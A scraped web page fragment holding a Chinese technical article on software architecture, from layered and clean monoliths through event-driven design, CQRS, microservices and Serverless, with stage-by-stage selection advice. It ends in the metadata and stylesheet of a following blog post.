.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在今天的软件开发实践中，“架构”已经不只是技术选型问题，而是关乎团队协作效率、系统可演进性以及业务竞争力的核心决策。很多初学者接触架构时，往往只看到零散的名词：分层、MVC、微服务、事件驱动、CQRS、Serverless……却很难把它们串成一条清晰的演进主线，更难落到实际项目中“该怎么选、怎么用”。</p>
<p>下面我会按照<strong>从传统到现代、从单体到云原生、从结构到哲学</strong>的脉络，系统讲解开发中常用的几类架构：它们各自解决什么问题、内部结构是什么样、在现代实践中如何组合使用，以及在不同项目阶段应如何做架构决策。</p>
<hr/>
<h2 data-id="heading-0">一、从单体分层到“整洁单体”：传统架构的现代价值</h2>
<h3 data-id="heading-1">1. 经典分层架构：从“堆代码”到“有序单体”</h3>
<p>长期以来，企业应用最普遍的形态是<strong>单体+分层架构</strong>：整个系统打成一个包部署，但内部按职责划分为几层：</p>
<ul>
<li>表现层（Controller / View）：处理 HTTP 请求、页面渲染、API 返回</li>
<li>业务层（Service）：封装领域规则和业务流程</li>
<li>数据访问层（DAO / Repository）：与数据库、缓存打交道</li>
<li>数据库层：MySQL、PostgreSQL、MongoDB 等</li>
</ul>
<p>这种结构的本质是：<strong>利用“纵向分层”让职责清晰、依赖有序</strong>。即便到今天，它依然是绝大多数中小项目最合适的起点。</p>
<p><strong>现代实践中的演进：</strong></p>
<p>过去的分层单体容易演变成“巨石应用”：所有业务都堆在一个 Service 包里，Service 调 Service 混乱不堪。为了解决这个问题，业界开始引入两种思路：</p>
<ol>
<li>
<p><strong>垂直切片（Vertical Slice）</strong>：<br/>
不再只关注“横向分层”，而是在单体中按业务领域做“纵向切割”：</p>
<pre><code class="hljs language-text" lang="text">/order
  ├─ OrderController
  ├─ OrderService
  ├─ OrderRepository
/payment
  ├─ PaymentController
  ├─ PaymentService
  └─ PaymentRepository
</code></pre>
<p>每个业务域形成独立模块，内部依然保持分层，但模块间依赖受控。这让单体内部的组织更加接近微服务，却保留了单体的部署和运维简单性。</p>
</li>
<li>
<p><strong>整洁架构思路的融入（Clean Architecture）</strong>：<br/>
Clean Architecture 强调：<strong>业务逻辑不应依赖框架与基础设施</strong>。应用被组织成同心圆：</p>
<ul>
<li>最内层：实体 / 领域模型（Entities）</li>
<li>中层：用例 / 应用服务（Use Cases / Application Services）</li>
<li>外层：接口适配器（Controllers、Presenters、Gateways）</li>
<li>最外层：框架与驱动（Web 框架、DB 驱动、消息中间件等）</li>
</ul>
<p>所有依赖只能“由外向内”。这保证了：</p>
<ul>
<li>核心业务代码可以在不启动 Web 容器、不连接数据库的情况下被测试</li>
<li>更换 Web 框架、数据库或消息中间件时，对内核影响有限</li>
</ul>
</li>
</ol>
<p>在实战中，一个做得好的“整洁单体”，往往比一个拆得很随意的“微服务集群”更稳定、更经济。</p>
<hr/>
<h2 data-id="heading-2">二、界面层架构：从 MVC 到组件化与 BFF</h2>
<h3 data-id="heading-3">1. MVC / MVVM：界面内部的组织方式</h3>
<p>MVC（Model-View-Controller）最初作为 UI 架构模式，引导我们把界面展示逻辑与业务处理解耦：</p>
<ul>
<li>Model：数据模型和基本业务规则</li>
<li>View：界面与展示</li>
<li>Controller：协调用户输入、业务调用和视图选择</li>
</ul>
<p>在后端框架中，如 Spring MVC、Django、ASP.NET MVC，MVC 更像是“请求-响应层”的组织方式。</p>
<p>进入前端 SPA（单页应用）时代，主流演变为：</p>
<ul>
<li><strong>MVVM</strong>（Vue、Knockout）：通过双向绑定，View 与 ViewModel 之间数据自动同步</li>
<li><strong>组件化 + 单向数据流</strong>（React）：一切皆组件，状态自上而下传递，事件自下而上传递</li>
</ul>
<p>这些都是<strong>界面层内部的架构模式</strong>，通常会与后端的分层架构、微服务架构结合使用。</p>
<h3 data-id="heading-4">2. BFF（Backend For Frontend）：多端时代的“前后端中间层”</h3>
<p>当一个系统同时服务 Web、iOS、Android、小程序、多种第三方系统时，“一个后端供所有前端使用”容易带来两个问题：</p>
<ul>
<li>API 难以同时满足多个前端对数据形态和性能的不同诉求</li>
<li>后端为适配多个前端而膨胀，接口逻辑变得非常复杂</li>
</ul>
<p>BFF 模式的解决方式是：<br/>
<strong>为每类前端定制一个轻量后端层</strong>，由它来负责：</p>
<ul>
<li>聚合多个微服务的数据，为前端组装所需视图模型</li>
<li>处理各终端差异化需求（字段裁剪、分页策略、缓存策略等）</li>
<li>屏蔽后端服务拓扑变化，降低前端耦合度</li>
</ul>
<p>架构上常见组合是：<br/>
<strong>“微服务集群” + “API 网关” + “多个 BFF 应用（按端划分）”</strong>。</p>
<hr/>
<h2 data-id="heading-5">三、C/S 与 B/S：从部署形态到边缘计算</h2>
<p>传统的 C/S（客户端–服务器）与 B/S（浏览器–服务器）之分，本质上是**“计算与状态位于何处”**的问题：</p>
<ul>
<li>C/S：厚客户端，许多逻辑在本地运行；更新成本高，但可离线、可深度优化体验</li>
<li>B/S：浏览器作为统一运行时；部署更新集中在服务器侧；依赖网络质量</li>
</ul>
<p>近年来边缘计算、PWA（渐进式 Web 应用）兴起后，这两者的界限变得模糊：</p>
<ul>
<li>Web 应用通过 Service Worker 实现离线缓存、本地存储与后台同步，获得类 C/S 的体验</li>
<li>传统桌面应用也大量采用 Web 技术（如 Electron），本质是“一个内嵌浏览器 + 本地资源”，与 B/S 融合</li>
</ul>
<p>现代项目通常不再单纯讨论“选 C/S 还是 B/S”，而是综合考虑：</p>
<ul>
<li>用户是否需要离线访问、大量本地计算或硬件能力</li>
<li>是否有严格的运维、升级和安全控制要求</li>
<li>是否需要通过边缘节点（CDN、Edge Function）进行前置计算</li>
</ul>
<hr/>
<h2 data-id="heading-6">四、事件驱动架构（EDA）：向解耦与实时演进</h2>
<p>当系统规模增大、业务流程变复杂，一个业务动作往往需要衍生出多种“后续行为”，例如：</p>
<ul>
<li>用户下单 → 扣库存 → 发送短信通知 → 推送推荐 → 更新统计报表</li>
<li>用户注册 → 发送欢迎邮件 → 创建新手任务 → 发放优惠券</li>
</ul>
<p>用同步调用去串联这些步骤，会让服务间依赖链条冗长、可靠性变差、耦合度高。<br/>
<strong>事件驱动架构</strong>通过“发布-订阅”的方式解耦这一切：</p>
<ol>
<li>核心服务完成主业务后，发布领域事件（如 <code>OrderCreated</code>）</li>
<li>其他服务订阅这些事件，根据需要做“后续操作”</li>
</ol>
<p>底层通常采用消息队列/流处理平台（如 Kafka、RabbitMQ、Pulsar），整体模式带来：</p>
<ul>
<li><strong>高解耦</strong>：新增一个“收到订单就发短信”的需求，只需新增一个消费者，不动原有代码</li>
<li><strong>异步与削峰填谷</strong>：高峰时事件排队处理，平滑后端压力</li>
<li><strong>更自然地支撑实时分析与风控</strong>：基于事件流做实时计算</li>
</ul>
<p>但 EDA 也引入复杂性：</p>
<ul>
<li><strong>一致性和顺序性</strong>：同一订单相关的多个事件处理顺序、幂等性问题需要设计</li>
<li><strong>可观测性</strong>：调用链不再是简单的“函数栈”，需要链路追踪和日志关联</li>
<li><strong>团队心智模型</strong>：从“过程式思维”过渡到“事件驱动思维”有一定门槛</li>
</ul>
<hr/>
<h2 data-id="heading-7">五、CQRS 与事件溯源：读写分离背后的架构深意</h2>
<p>当系统的读写负载、性能要求和业务复杂度不断提升时，“一张表同时满足读写”会遇到瓶颈：</p>
<ul>
<li>写：需要严格的业务规则验证、一致性保障、事务处理</li>
<li>读：需要灵活多变的视图、复杂的查询条件、极致的性能</li>
</ul>
<p>**CQRS（命令查询职责分离）**就是在架构层面对这种矛盾的回应：</p>
<ul>
<li>写侧（Command Side）：专注处理业务命令，维护“事实”，强调完整性和一致性</li>
<li>读侧（Query Side）：专注为界面/接口提供高性能查询，数据结构可以为“读”而生</li>
</ul>
<p>在实践中，CQRS 往往与**事件溯源（Event Sourcing）**结合，形成一种强力模式：</p>
<ol>
<li><strong>状态不再直接存为“最新快照”，而是存为“事件序列”</strong>：<br/>
例如订单状态不存为一个 <code>status</code> 字段，而是 <code>OrderCreated</code>、<code>OrderPaid</code>、<code>OrderShipped</code> 等事件的有序列表。</li>
<li><strong>当前状态可通过重放事件得到</strong>：
<ul>
<li>写侧只需保障事件的正确写入</li>
<li>读侧从事件流构建各类“物化视图”（Materialized Views）</li>
</ul>
</li>
</ol>
<p>优点包括：</p>
<ul>
<li>对读写模型进行独立优化和横向扩展</li>
<li>任意重建查询视图以适应新需求，支持“回放历史”、审计和调试</li>
<li>对读侧采用高度去范式化的表结构，查询效率极高</li>
</ul>
<p>代价则是：</p>
<ul>
<li>必须接受<strong>最终一致性</strong>：读侧数据可能比写侧略滞后</li>
<li>实现与运营复杂度提高，需要团队在 DDD、消息处理、幂等等方面具备成熟经验</li>
<li>并非适合所有业务，尤其不适合简单 CRUD 场景</li>
</ul>
<hr/>
<h2 data-id="heading-8">六、微服务架构：从“大拆分”到精细演进</h2>
<p>微服务不应该被看成一种“潮流”，而是<strong>在业务与团队规模发展到一定程度后，为解决单体架构扩展瓶颈的自然结果</strong>。</p>
<h3 data-id="heading-9">1. 微服务的核心原则</h3>
<ul>
<li>按<strong>业务能力</strong>拆分服务，而不是按技术层次拆分（比如“订单服务”“库存服务”，而不是“公共 Service1、Service2”）</li>
<li>每个服务<strong>独立部署、独立扩缩容、独立技术栈</strong>甚至独立数据库</li>
<li>服务间通过明确定义的 API 或消息进行通信（HTTP/gRPC/消息队列）</li>
</ul>
<p>围绕微服务，现代体系中几乎总会出现的一整套基础设施：</p>
<ul>
<li><strong>API 网关</strong>：统一入口，路由、认证、限流、灰度发布</li>
<li><strong>服务注册与发现</strong>：如 Nacos、Consul，让服务知道“别人在哪儿”</li>
<li><strong>配置中心</strong>：集中管理配置和密钥</li>
<li><strong>服务网格（Service Mesh）</strong>：如 Istio/Linkerd，将流量治理、熔断、重试、指标采集下沉到“基础设施层”</li>
<li><strong>可观测性体系</strong>：统一日志、指标、链路追踪</li>
</ul>
<h3 data-id="heading-10">2. 微服务何时“值得上”</h3>
<p>一般可以从以下几个维度判断：</p>
<ul>
<li>业务复杂度：领域多、边界清晰，如大型电商、金融交易、ERP 平台</li>
<li>团队规模：多团队、多职能协作，需要各自独立迭代和部署</li>
<li>非功能性需求：高可用、高并发、可弹性扩容、强自治</li>
</ul>
<p>同时也必须看到其成本：</p>
<ul>
<li>分布式带来的<strong>一致性、事务、调试</strong>难题</li>
<li>运维与监控复杂度显著上升，对 DevOps/平台工程能力要求极高</li>
<li>业务划分不当会导致“分布式单体”，既失去了单体的简单，又没有获得真正的解耦</li>
</ul>
<p><strong>实战更推荐的路径是：</strong></p>
<blockquote>
<p>先把单体做干净 —— 按领域模块化、引入整洁架构思想、完善自动化测试和 CI/CD —— 等单体在组织或性能层面的瓶颈真正显现，再有计划地“按业务域逐步拆分为微服务”。</p>
</blockquote>
<hr/>
<h2 data-id="heading-11">七、Serverless：无服务器背后的新范式</h2>
<p>Serverless（无服务器架构）并非不需要服务器，而是<strong>将服务器的管理责任完全交给云厂商</strong>，开发者只关注函数或小服务级别的业务逻辑：</p>
<ul>
<li>FaaS（函数即服务）：如 AWS Lambda、阿里云函数计算</li>
<li>Serverless 容器：如 Cloud Run、Fargate</li>
</ul>
<p>关键特征：</p>
<ul>
<li>按调用量和执行时间计费，<strong>极大适合低频或波动流量场景</strong></li>
<li>自动伸缩，无需自己搭建和维护集群</li>
<li>推荐用于：
<ul>
<li>事件驱动型任务（文件上传、消息消费、定时任务）</li>
<li>一些边缘逻辑（如活动页接口、Webhook 处理器）</li>
<li>业务流量峰谷变化很大的场景</li>
</ul>
</li>
</ul>
<p>但要注意：</p>
<ul>
<li>存在“冷启动”问题，首次调用可能有明显延迟</li>
<li>有较强的厂商绑定，迁移成本高</li>
<li>架构上必须非常注意<strong>状态外置</strong>（数据库、缓存、对象存储）</li>
</ul>
<p>在现代系统中，一个比较理想的组合是：<br/>
<strong>核心业务用“整洁单体或微服务”承载；大量边缘功能用 Serverless 承接</strong>，达成成本、弹性和复杂度的平衡。</p>
<hr/>
<h2 data-id="heading-12">八、如何根据项目阶段选择合适架构（可操作建议）</h2>
<p>结合上面这些模式，可以给出一个偏“落地”的选型框架。你可以粗略对照自己的项目，看看更适合哪条路线。</p>
<h3 data-id="heading-13">1. 初创或中小项目（单团队、需求模糊）</h3>
<p><strong>推荐：</strong></p>
<ul>
<li>技术形态：B/S + 分层单体</li>
<li>组织方式：按业务领域做模块划分（垂直切片）</li>
<li>架构原则：尽量应用 Clean Architecture 思想，确保业务逻辑与框架解耦</li>
</ul>
<p><strong>重点：</strong></p>
<ul>
<li>不要过早上微服务，不要为尚不存在的复杂性买单</li>
<li>用清晰的代码结构、自动化测试和规范的接口设计来“预防未来的腐化”</li>
</ul>
<h3 data-id="heading-14">2. 业务逐渐复杂、团队开始分拆</h3>
<p><strong>可以引入：</strong></p>
<ul>
<li>领域驱动设计（DDD）的基础概念：领域、聚合、限界上下文</li>
<li>局部采用事件驱动（EDA）优化解耦与异步处理</li>
<li>对某几个“读压力巨大”的功能使用 CQRS 做读写分离</li>
</ul>
<p><strong>此阶段目标：</strong></p>
<ul>
<li>在保持单体部署的前提下，先把“架构内功”练扎实</li>
<li>通过清晰领域边界，为未来的微服务拆分打下基础</li>
</ul>
<h3 data-id="heading-15">3. 多团队、多业务线、高并发要求</h3>
<p><strong>可以渐进式引入：</strong></p>
<ul>
<li>微服务架构：从最独立、最稳定的领域开始拆分（如用户、账务、通知）</li>
<li>API 网关、服务注册发现、配置中心、链路追踪等配套设施</li>
<li>服务网格用于统一治理调用、流量与安全</li>
</ul>
<p><strong>同时：</strong></p>
<ul>
<li>对关键业务链路可以叠加事件驱动架构，简化耦合、提升扩展性</li>
<li>在交易、风控、报表等复杂场景引入 CQRS + 事件溯源（视业务复杂度选择）</li>
</ul>
<h3 data-id="heading-16">4. 大规模云原生与成本优化阶段</h3>
<p>在已经稳定运营的微服务体系之上，再引入：</p>
<ul>
<li>Serverless 承接零散、波动大的边缘任务</li>
<li>在边缘节点部署部分服务，降低延迟</li>
<li>使用基础设施即代码（IaC）、GitOps 等管理大规模环境</li>
</ul>
<hr/>
<h2 data-id="heading-17">九、总结：架构的价值，不在“多高级”，而在“多适合”</h2>
<p>如果用一句话来概括上面的内容：</p>
<blockquote>
<p>架构不是炫技，而是让业务<strong>以最小的心智和运维成本，获得足够的灵活性、性能和可靠性</strong>。</p>
</blockquote>
<p>因此：</p>
<ul>
<li><strong>不要因为“流行”而上微服务、CQRS、Serverless</strong>，而要因为“遇到了它所解决的问题”</li>
<li><strong>单体并不低级</strong>，一个做好了领域划分与整洁设计的单体，是多数团队最具性价比的选择</li>
<li><strong>架构不是一锤子买卖，而是一条演进路径</strong>：从整洁单体 → 模块化单体 → 渐进式微服务 → 云原生 &amp; Serverless</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025：从用 AI 到学 AI，我最轻松也最忙碌的一年]]></title>    <link>https://juejin.cn/post/7592452108798181419</link>    <guid>https://juejin.cn/post/7592452108798181419</guid>    <pubDate>2026-01-08T01:50:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592452108798181419" data-draft-id="7592134330313064491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025：从用 AI 到学 AI，我最轻松也最忙碌的一年"/> <meta itemprop="keywords" content="后端,人工智能,AI编程"/> <meta itemprop="datePublished" content="2026-01-08T01:50:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="洛卡卡了"/> <meta itemprop="url" content="https://juejin.cn/user/888839672963544"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025：从用 AI 到学 AI，我最轻松也最忙碌的一年
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/888839672963544/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    洛卡卡了
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:50:05.000Z" title="Thu Jan 08 2026 01:50:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body 